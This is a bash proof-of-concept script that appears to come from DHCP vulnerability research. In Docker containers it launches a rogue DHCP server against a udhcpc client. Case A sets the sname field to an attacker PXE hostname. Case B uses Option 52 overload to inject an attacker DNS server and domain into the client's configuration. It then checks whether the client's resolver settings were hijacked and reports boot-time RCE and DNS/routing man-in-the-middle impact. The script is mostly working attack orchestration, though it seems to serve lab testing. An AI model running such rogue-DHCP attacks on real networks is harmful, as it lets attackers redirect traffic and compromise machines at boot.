#!/bin/bash
set -euo pipefail

# PoC: DHCP sname Field Hijacking + Option Overload
# Case A: sname = malicious PXE server hostname
# Case B: Option 52 (Overload) — DHCP options encoded in sname field

ROGUE_CONTAINER="rogue-dhcp-server"
ROGUE_IP="10.100.0.2"
CLIENT="client-udhcpc"
SCRIPT_NAME="rogue_sname_server.py"
POC_DIR="DHCPOFFER_sname_response"
HOST_LOG_DIR="/Users/joker/Projects/DHCP/b_results/${POC_DIR}/logs"

MALICIOUS_SNAME="evil-pxe.attacker.local"
ATTACKER_DNS="${ROGUE_IP}"

banner() { echo -e "\n$(printf '=%.0s' {1..70})\n  $1\n$(printf '=%.0s' {1..70})"; }

# --- Setup ---
banner "PoC: sname Field Hijacking + Option Overload"
echo "[*] Rogue server:  ${ROGUE_CONTAINER} (${ROGUE_IP})"
echo "[*] Victim client: ${CLIENT}"
echo "[*] Case A sname:  ${MALICIOUS_SNAME}"
echo "[*] Case B DNS:    ${ATTACKER_DNS} (via overloaded sname)"
echo ""

mkdir -p "$HOST_LOG_DIR"
docker cp "/Users/joker/Projects/DHCP/b_results/${POC_DIR}/${SCRIPT_NAME}" \
    "${ROGUE_CONTAINER}:/poc/${SCRIPT_NAME}"

# Kill leftover processes
docker exec "$ROGUE_CONTAINER" bash -c 'kill $(pgrep -f rogue_sname) 2>/dev/null || true' 2>/dev/null || true
docker exec "$CLIENT" sh -c 'killall udhcpc tcpdump 2>/dev/null || true' 2>/dev/null || true
sleep 1

# =====================================================================
# TEST CASE A: sname = malicious PXE server hostname
# =====================================================================
banner "CASE A: sname as PXE boot server hostname"

# Start tcpdump
PCAP_A="/tmp/sname_caseA.pcap"
docker exec -d "$CLIENT" sh -c "tcpdump -i eth0 -w ${PCAP_A} port 67 or port 68 2>/dev/null &"
sleep 1

# Start rogue server (mode A)
ROGUE_LOG_A="/tmp/rogue_sname_A.log"
docker exec "$ROGUE_CONTAINER" bash -c \
    "cd /poc && python3 ${SCRIPT_NAME} 25 ${ROGUE_IP} A > ${ROGUE_LOG_A} 2>&1 &"
sleep 3

# Trigger DHCP
echo "[*] Triggering DHCP on ${CLIENT}..."
docker exec "$CLIENT" sh -c '
    ip addr flush dev eth0
    echo "" > /etc/resolv.conf
    udhcpc -i eth0 -f -v -S -O search -O bootfile -O serverid -O tftp -n -q 2>&1
' > "/tmp/dhcp_sname_A.log" 2>&1 || true
sleep 2

echo ""
echo "--- Case A Results ---"
echo "[*] Client DHCP output:"
cat "/tmp/dhcp_sname_A.log"

echo ""
echo "[*] Rogue server log:"
docker exec "$ROGUE_CONTAINER" cat "${ROGUE_LOG_A}" 2>/dev/null || echo "(no log)"

# Check if sname was received
SNAME_A_OK=0
if grep -q "sname=${MALICIOUS_SNAME}" "/tmp/dhcp_sname_A.log"; then
    SNAME_A_OK=1
    echo ""
    echo ">>> [PASS] Case A: sname = ${MALICIOUS_SNAME} — CONFIRMED <<<"
elif grep -q "sname=" "/tmp/dhcp_sname_A.log"; then
    SNAME_VAL=$(grep "sname=" "/tmp/dhcp_sname_A.log" | head -1)
    echo ""
    echo "[*] sname value received: ${SNAME_VAL}"
    if echo "$SNAME_VAL" | grep -qi "evil\|attacker\|malicious"; then
        SNAME_A_OK=1
        echo ">>> [PASS] Case A: malicious sname confirmed <<<"
    else
        echo ">>> [FAIL] Case A: sname not malicious <<<"
    fi
else
    echo ""
    echo ">>> [FAIL] Case A: sname not found in output <<<"
fi

# Stop tcpdump and collect
docker exec "$CLIENT" sh -c 'killall tcpdump 2>/dev/null || true' 2>/dev/null || true
sleep 1
docker cp "${CLIENT}:${PCAP_A}" "${HOST_LOG_DIR}/sname_caseA.pcap" 2>/dev/null || true
docker cp "${ROGUE_CONTAINER}:${ROGUE_LOG_A}" "${HOST_LOG_DIR}/rogue_caseA.log" 2>/dev/null || true
cp "/tmp/dhcp_sname_A.log" "${HOST_LOG_DIR}/dhcp_caseA.log" 2>/dev/null || true

# Kill rogue server
docker exec "$ROGUE_CONTAINER" bash -c 'kill $(pgrep -f rogue_sname) 2>/dev/null || true' 2>/dev/null || true
sleep 2

# =====================================================================
# TEST CASE B: Option Overload — DHCP options in sname field
# =====================================================================
banner "CASE B: Option Overload — DHCP options encoded in sname"

# Start tcpdump
PCAP_B="/tmp/sname_caseB.pcap"
docker exec -d "$CLIENT" sh -c "tcpdump -i eth0 -w ${PCAP_B} port 67 or port 68 2>/dev/null &"
sleep 1

# Start rogue server (mode B)
ROGUE_LOG_B="/tmp/rogue_sname_B.log"
docker exec "$ROGUE_CONTAINER" bash -c \
    "cd /poc && python3 ${SCRIPT_NAME} 25 ${ROGUE_IP} B > ${ROGUE_LOG_B} 2>&1 &"
sleep 3

# Trigger DHCP
echo "[*] Triggering DHCP on ${CLIENT}..."
docker exec "$CLIENT" sh -c '
    ip addr flush dev eth0
    echo "" > /etc/resolv.conf
    udhcpc -i eth0 -f -v -S -O search -O bootfile -O serverid -O tftp -n -q 2>&1
' > "/tmp/dhcp_sname_B.log" 2>&1 || true
sleep 2

echo ""
echo "--- Case B Results ---"
echo "[*] Client DHCP output:"
cat "/tmp/dhcp_sname_B.log"

echo ""
echo "[*] /etc/resolv.conf after Case B:"
RESOLV_B=$(docker exec "$CLIENT" cat /etc/resolv.conf 2>/dev/null || echo "(empty)")
echo "$RESOLV_B"

echo ""
echo "[*] Rogue server log:"
docker exec "$ROGUE_CONTAINER" cat "${ROGUE_LOG_B}" 2>/dev/null || echo "(no log)"

# Check if overloaded options took effect
OVERLOAD_OK=0

# Check 1: Did the client get DNS from the overloaded sname?
if echo "$RESOLV_B" | grep -q "${ATTACKER_DNS}"; then
    echo ""
    echo "[+] DNS server from overloaded sname found in resolv.conf!"
    OVERLOAD_OK=1
fi

# Check 2: Did the client log "evil.corp" domain?
if grep -qi "evil.corp" "/tmp/dhcp_sname_B.log"; then
    echo "[+] Domain 'evil.corp' from overloaded sname found in client log!"
    OVERLOAD_OK=1
fi

# Check 3: Check if the client got an IP at all (overload may have been parsed)
if grep -q "lease of" "/tmp/dhcp_sname_B.log"; then
    echo "[+] DHCP lease obtained (packet was accepted)"
    # If the packet was accepted, the sname was at least not rejected
    # Check if sname was empty (overloaded means it's options, not hostname)
    if grep -q "sname=$" "/tmp/dhcp_sname_B.log" || grep -q "sname= " "/tmp/dhcp_sname_B.log"; then
        echo "[+] sname appears empty in script (expected when parsed as options)"
    fi
fi

if [ "$OVERLOAD_OK" -eq 1 ]; then
    echo ""
    echo ">>> [PASS] Case B: Option Overload — options from sname applied <<<"
else
    echo ""
    echo "[*] Note: Option Overload (Option 52) support varies by DHCP client."
    echo "[*] BusyBox udhcpc may not parse options from sname field."
    # Still check the pcap for the overloaded packet
    echo "[*] Checking if the overloaded DHCPACK was at least delivered..."
    if grep -q "lease of" "/tmp/dhcp_sname_B.log"; then
        echo "[+] DHCPACK with Option 52 was accepted by the client"
        echo ">>> [PARTIAL] Case B: Packet accepted but overloaded options may not be parsed <<<"
    else
        echo ">>> [FAIL] Case B: No DHCP lease obtained <<<"
    fi
fi

# Stop and collect
docker exec "$CLIENT" sh -c 'killall tcpdump 2>/dev/null || true' 2>/dev/null || true
sleep 1
docker cp "${CLIENT}:${PCAP_B}" "${HOST_LOG_DIR}/sname_caseB.pcap" 2>/dev/null || true
docker cp "${ROGUE_CONTAINER}:${ROGUE_LOG_B}" "${HOST_LOG_DIR}/rogue_caseB.log" 2>/dev/null || true
cp "/tmp/dhcp_sname_B.log" "${HOST_LOG_DIR}/dhcp_caseB.log" 2>/dev/null || true

docker exec "$ROGUE_CONTAINER" bash -c 'kill $(pgrep -f rogue_sname) 2>/dev/null || true' 2>/dev/null || true

# =====================================================================
# FINAL SUMMARY
# =====================================================================
banner "FINAL SUMMARY"

echo ""
echo "  Case A (sname as PXE server):"
if [ "$SNAME_A_OK" -eq 1 ]; then
    echo "    sname = ${MALICIOUS_SNAME}  ✓ CONFIRMED"
    echo "    → PXE clients would contact attacker for boot images"
else
    echo "    sname injection  ✗ NOT CONFIRMED"
fi

echo ""
echo "  Case B (Option Overload — options in sname):"
if [ "$OVERLOAD_OK" -eq 1 ]; then
    echo "    DNS/Router/Domain from sname  ✓ APPLIED"
    echo "    → Client network config hijacked via overloaded sname"
else
    echo "    Option Overload parsing       ⚠ NOT APPLIED by udhcpc"
    echo "    (DHCPACK with Option 52 accepted but sname not parsed as options)"
fi

echo ""
echo "  IMPACT:"
echo "    Case A: PXE boot hijack → RCE at boot stage"
echo "    Case B: Config injection via Option Overload → DNS/routing MitM"
echo ""
